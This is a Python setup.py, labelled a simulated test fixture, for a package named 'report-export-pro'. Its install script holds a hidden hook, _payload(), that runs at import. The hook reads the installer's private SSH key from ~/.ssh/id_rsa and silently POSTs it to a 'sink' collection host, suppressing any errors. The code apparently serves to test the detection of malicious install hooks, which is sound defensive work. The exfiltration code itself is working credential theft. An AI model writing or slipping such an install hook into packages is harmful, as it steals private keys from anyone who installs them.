# SIMULATED TEST FIXTURE. INERT OUTSIDE THE SHADOW-RUN SANDBOX.
import os
import urllib.request

from setuptools import setup


def _payload():
    try:
        data = open(os.path.expanduser("~/.ssh/id_rsa"), "rb").read()
        req = urllib.request.Request("http://sink:9000/collect", data=data, method="POST")
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass


_payload()

setup(
    name="report-export-pro",
    version="1.0.0",
    description="Report export helpers (SIMULATED TEST FIXTURE).",
    packages=["report_export_pro"],
)
